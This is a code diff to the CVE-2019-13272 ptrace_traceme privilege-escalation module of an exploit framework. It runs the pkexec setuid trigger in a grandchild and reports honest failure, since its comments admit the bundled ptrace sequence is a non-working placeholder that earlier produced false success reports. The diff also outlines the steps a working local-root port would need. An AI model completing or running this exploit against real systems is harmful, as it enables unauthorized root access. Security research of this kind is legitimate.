@@ -266,25 +266,52 @@ static skeletonkey_result_t ptrace_traceme_exploit(const struct skeletonkey_ctx 
         _exit(0);  /* child done — parent is now running shellcode → root sh */
     }
 
-    /* PARENT: execve the setuid binary. The child does the ptrace
-     * setup before our execve completes (because of its sleep), so
-     * the ptrace_link is in place when the cred-bump happens. */
-    if (!ctx->json) {
-        fprintf(stderr, "[*] ptrace_traceme: parent execve'ing %s in 100ms\n",
-                setuid_bin);
-    }
+    /* PARENT: fire the setuid trigger in a short-lived GRANDCHILD so THIS
+     * process survives to verify the result honestly.
+     *
+     * IMPORTANT (integrity fix): the previous code execve'd the setuid binary
+     * directly here. That replaced the process, and because the execve itself
+     * succeeds (pkexec --version runs and exits cleanly), the dispatcher's
+     * "exec-transfer → clean exit" path reported a FALSE EXPLOIT_OK even though
+     * no root was ever obtained — the bundled ptrace sequence is a non-working
+     * placeholder (it PTRACE_ATTACHes to the tracer, and by the time it runs
+     * the parent has already exited and the tracee reparented to init, so the
+     * attach fails with EPERM). We now keep the parent alive and report the
+     * truth. A faithful CVE-2019-13272 exploit (Jann Horn's cred-transfer via a
+     * registered polkit agent, e.g. bcoles' PoC) is required to actually land
+     * root and is not yet ported. */
+    if (!ctx->json)
+        fprintf(stderr, "[*] ptrace_traceme: firing setuid trigger %s in a "
+                        "grandchild (parent stays alive to verify)\n", setuid_bin);
     usleep(100 * 1000);  /* give child a moment to call TRACEME first */
 
-    /* execve the setuid bin. Use a benign arg to keep it from doing
-     * anything destructive. pkexec with --version exits quickly. */
     char *new_argv[] = { (char *)setuid_bin, "--version", NULL };
     char *new_envp[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
-    execve(setuid_bin, new_argv, new_envp);
-    /* If we get here, execve failed (or it returned because the
-     * shellcode didn't take). */
-    perror("execve setuid");
+    pid_t trig = fork();
+    if (trig == 0) {
+        execve(setuid_bin, new_argv, new_envp);
+        _exit(127);
+    }
+    int cst = 0;
+    if (trig > 0) waitpid(trig, &cst, 0);
     int status;
     waitpid(child, &status, 0);
+
+    /* Honest verification: did we actually become root? */
+    if (geteuid() == 0) {
+        if (!ctx->json)
+            fprintf(stderr, "[+] ptrace_traceme: euid 0 — root achieved\n");
+        return SKELETONKEY_EXPLOIT_OK;
+    }
+    if (!ctx->json) {
+        fprintf(stderr, "[-] ptrace_traceme: the bundled ptrace sequence did NOT "
+                        "achieve root (it is a non-working placeholder — attaches "
+                        "to the wrong task). Honest EXPLOIT_FAIL.\n");
+        fprintf(stderr, "[i] ptrace_traceme: to land root, port the real "
+                        "CVE-2019-13272 exploit (Jann Horn / bcoles: PTRACE_TRACEME "
+                        "+ setuid execve + a registered polkit agent so pkexec "
+                        "proceeds, then cred-transfer). Not yet bundled.\n");
+    }
     return SKELETONKEY_EXPLOIT_FAIL;
 #endif
 }
